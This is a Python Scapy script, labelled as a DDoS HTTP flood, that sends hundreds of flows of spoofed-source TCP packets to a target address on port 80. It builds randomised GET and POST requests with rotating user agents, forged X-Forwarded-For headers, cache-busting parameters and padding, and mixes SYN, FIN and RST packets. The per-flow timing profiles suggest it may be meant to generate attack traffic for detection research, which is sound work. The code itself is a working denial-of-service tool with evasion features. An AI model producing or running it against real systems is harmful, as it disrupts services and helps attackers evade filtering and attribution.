from scapy.all import *
import random
import time

TARGET_IP = "192.168.1.1"
TARGET_PORT = 80
FLOWS = 500
MIN_PACKETS = 5
MAX_PACKETS = 30

HTTP_METHODS = ["GET", "POST", "HEAD", "PUT", "OPTIONS"]

HTTP_PATHS = [
    "/", "/index.html", "/home", "/login", "/search",
    "/products", "/api/data", "/images/logo.png",
    "/css/style.css", "/js/app.js", "/contact",
    "/about", "/checkout", "/cart", "/user/profile",
    "/api/v1/users", "/api/v1/products", "/admin",
    "/wp-admin", "/static/main.js",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/115.0",
    "curl/7.88.1",
    "python-requests/2.28.0",
    "Go-http-client/1.1",
]

ACCEPT_HEADERS = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/json, text/plain, */*",
    "*/*",
    "text/html, */*;q=0.8",
]

print(f"[*] Starting DDoS HTTP Flood -> {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Sending {FLOWS} flows x {MIN_PACKETS}-{MAX_PACKETS} packets")

for f in range(FLOWS):
    # --- Flow-level parameters (fixed for entire flow) ---
    src_ip     = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    sport      = random.randint(1024, 65535)
    ttl        = random.randint(32, 128)
    window     = random.choice([8192, 16384, 32768, 65535])
    seq        = random.randint(0, 2**32 - 1)
    ack_num    = random.randint(0, 2**32 - 1)
    packets    = random.randint(MIN_PACKETS, MAX_PACKETS)

    # Per-flow HTTP profile
    method     = random.choice(HTTP_METHODS)
    user_agent = random.choice(USER_AGENTS)
    accept     = random.choice(ACCEPT_HEADERS)
    keep_alive = random.choice(["keep-alive", "close"])

    # Per-flow IAT profile
    iat_min    = random.uniform(0.0001, 0.005)
    iat_max    = random.uniform(iat_min + 0.001, 0.05)

    for p in range(packets):

        path       = random.choice(HTTP_PATHS)
        rand_param = random.randint(1, 999999)
        rand_cache = random.randint(1, 999999)

        # Flag rotation per packet — simulates full HTTP session lifecycle
        # PA = data, S = open, FA = close, R = reset
        flag = random.choice(["PA", "S", "FA", "R"])

        # Only build HTTP payload for PSH+ACK packets
        if flag == "PA":
            if method == "POST":
                body = (
                    f"data={random.randint(1000,9999)}"
                    f"&token={random.randint(100000,999999)}"
                    f"&session={random.randint(100000,999999)}"
                    f"&ts={random.randint(1000000,9999999)}"
                    f"&pad={'x' * random.randint(10, 200)}"
                )
                http_request = (
                    f"POST {path}?r={rand_param} HTTP/1.1\r\n"
                    f"Host: {TARGET_IP}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Accept: {accept}\r\n"
                    f"Connection: {keep_alive}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"X-Request-ID: {random.randint(100000,999999)}\r\n"
                    f"\r\n"
                    f"{body}"
                )
            else:
                http_request = (
                    f"{method} {path}?r={rand_param}&nocache={rand_cache} HTTP/1.1\r\n"
                    f"Host: {TARGET_IP}\r\n"
                    f"User-Agent: {user_agent}\r\n"
                    f"Accept: {accept}\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Connection: {keep_alive}\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"X-Request-ID: {random.randint(100000,999999)}\r\n"
                    f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\n"
                    f"X-Padding: {'x' * random.randint(10, 200)}\r\n"
                    f"\r\n"
                )
            payload = http_request.encode()
        else:
            # SYN / FIN+ACK / RST — no HTTP payload
            payload = b""

        pkt = IP(
            src = src_ip,
            dst = TARGET_IP,
            ttl = ttl,
            id  = random.randint(1, 65535)
        ) / TCP(
            sport  = sport,
            dport  = TARGET_PORT,   # port 80 = HTTP=1
            flags  = flag,          # varies per packet
            seq    = seq + p,
            ack    = ack_num,
            window = window
        ) / Raw(load=payload)

        send(pkt, verbose=0)
        time.sleep(random.uniform(iat_min, iat_max))

    time.sleep(random.uniform(0.01, 0.05))

    if (f + 1) % 20 == 0:
        print(f"[+] {f + 1}/{FLOWS} flows sent")

print("[*] Done.")